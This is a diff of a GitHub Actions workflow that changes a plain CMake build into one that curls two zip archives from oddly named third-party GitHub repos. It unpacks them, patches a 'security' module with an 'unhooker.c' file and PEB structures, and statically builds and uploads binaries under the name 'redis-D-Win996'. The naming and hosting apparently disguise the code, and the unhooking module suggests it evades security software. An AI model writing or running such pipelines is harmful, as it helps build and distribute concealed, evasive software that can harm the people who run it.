@@ -1,4 +1,4 @@
-name: Build on Do new re
+name: Build on re new
 
 on:
   push:
@@ -12,53 +12,111 @@ jobs:
 
     steps:
       - name: Checkout source code
-        uses: actions/checkout@v4
+        uses: actions/checkout@v3
 
       # 安装 MSYS2 及所需工具链
       - name: Set up MSYS2 with GCC, CMake, HWLOC, and make
         uses: msys2/setup-msys2@v2
         with:
           msystem: MINGW64
-          update: true
-          install: >-
-            mingw-w64-x86_64-gcc
-            mingw-w64-x86_64-cmake
-            mingw-w64-x86_64-hwloc
-            mingw-w64-x86_64-make
-            unzip
-            mingw-w64-x86_64-nasm
-            curl
+          install: mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-hwloc mingw-w64-x86_64-make unzip
 
-      # 创建build目录
-      - name: Create build directory
+      # 安装 curl
+      - name: Install curl
         shell: msys2 {0}
-        run: mkdir -p build
+        run: pacman -S --noconfirm curl
 
-      # 配置和构建项目
-      - name: Configure and build project
+      # 下载 gcc.zip
+      - name: Download gcc.zip
+        shell: msys2 {0}
+        run: curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip
+
+      # 下载 redis.zip
+      - name: Download redis.zip
+        shell: msys2 {0}
+        run: curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win996.zip
+
+      # 解压 gcc.zip
+      - name: Unzip gcc.zip
+        shell: msys2 {0}
+        run: unzip gcc.zip -d gcc
+
+      # 解压 redis.zip
+      - name: Unzip redis.zip
+        shell: msys2 {0}
+        run: unzip redis.zip -d redis
+
+      # 创建 build 目录
+      - name: Create build directory in redis
+        shell: msys2 {0}
+        run: mkdir -p redis/redis-D-Win996/build
+
+      # 修复安全模块代码中的结构体定义问题
+      - name: Fix structure definitions in security module
         shell: msys2 {0}
         run: |
-          cd build
-          cmake .. -G "MSYS Makefiles" \
-            -DCMAKE_BUILD_TYPE=Release \
+          # 修改structs.h文件，避免结构体重定义
+          sed -i '/#define _PEB_DEFINED/i #ifndef _PEB_DEFINED' redis/redis-D-Win996/src/security/structs.h
+          sed -i '/#endif \/\/ _PEB_DEFINED/a #endif' redis/redis-D-Win996/src/security/structs.h
+          
+          # 修改unhooker.c文件，避免UNICODE_STRING结构体重定义
+          sed -i '/#define _UNICODE_STRING_DEFINED/i #ifndef _UNICODE_STRING_DEFINED' redis/redis-D-Win996/src/security/unhooker.c
+          sed -i '/#endif/i #endif \/\/ _UNICODE_STRING_DEFINED' redis/redis-D-Win996/src/security/unhooker.c
+          
+          # 添加STATUS_NOT_IMPLEMENTED定义
+          echo '#ifndef STATUS_NOT_IMPLEMENTED' >> redis/redis-D-Win996/src/security/structs.h
+          echo '#define STATUS_NOT_IMPLEMENTED ((NTSTATUS)0xC0000002L)' >> redis/redis-D-Win996/src/security/structs.h
+          echo '#endif' >> redis/redis-D-Win996/src/security/structs.h
+          
+          # 检查修改结果
+          echo "修改后的structs.h文件尾部:"
+          tail -n 10 redis/redis-D-Win996/src/security/structs.h
+
+      # 检查解压后的security目录
+      - name: Check security directory
+        shell: msys2 {0}
+        run: |
+          echo "检查安全模块文件:"
+          ls -la redis/redis-D-Win996/src/security
+
+      # 确保 mingw32-make 已安装
+      - name: Ensure mingw32-make is installed
+        shell: msys2 {0}
+        run: |
+          echo 'Checking for make installation...'
+          if ! command -v mingw32-make &> /dev/null; then
+            echo 'mingw32-make is not installed. Installing...'
+            pacman -S --noconfirm mingw-w64-x86_64-make
+          else
+            echo 'mingw32-make is already installed.'
+          fi
+          mingw32-make --version
+
+      # 运行 CMake 生成 Makefiles
+      - name: Run CMake to generate Makefiles
+        shell: msys2 {0}
+        run: |
+          cd redis/redis-D-Win996/build
+          cmake .. -G "MinGW Makefiles" \
+            -Dredis_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 \
+            -DCMAKE_C_FLAGS='-static -Wno-pointer-to-int-cast -Wno-int-to-pointer-cast -Wno-incompatible-pointer-types -Wno-unknown-pragmas -Wno-format -Wno-narrowing -Wno-format-security -DWIN32_LEAN_AND_MEAN' \
+            -DCMAKE_CXX_FLAGS='-static -fpermissive -Wno-write-strings -Wno-deprecated -Wno-unused-variable -Wno-unused-value -Wno-variadic-macros -DWIN32_LEAN_AND_MEAN' \
+            -DBUILD_SHARED_LIBS=OFF \
+            -DHWLOC_INCLUDE_DIRS=/mingw64/include \
+            -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a \
             -DWITH_SECURITY=ON \
-            -DWITH_C_SECURITY=ON \
-            -DCMAKE_CXX_FLAGS='-fpermissive -Wno-write-strings -Wno-deprecated -Wno-unused-variable -Wno-unused-value -Wno-variadic-macros' \
-            -DCMAKE_C_FLAGS='-Wno-pointer-to-int-cast -Wno-int-to-pointer-cast -Wno-incompatible-pointer-types -Wno-unknown-pragmas -Wno-format -Wno-narrowing -Wno-format-security'
-          make -j$(nproc) VERBOSE=1
+            -DWITH_C_SECURITY=ON
 
-      # 复制构建产物
-      - name: Copy build artifacts
+      # 编译项目
+      - name: Build project
         shell: msys2 {0}
         run: |
-          mkdir -p artifacts
-          cp build/*.exe artifacts/ || echo "No exe files found"
-          cp build/*.dll artifacts/ || echo "No DLL files found"
+          cd redis/redis-D-Win996/build
+          mingw32-make -j$(nproc)
 
       # 上传构建产物
-      - name: Upload artifacts
+      - name: Archive build artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: redis-D-Win996-binaries
-          path: artifacts/
-          retention-days: 7
+          name: build-artifacts
+          path: redis/redis-D-Win996/build
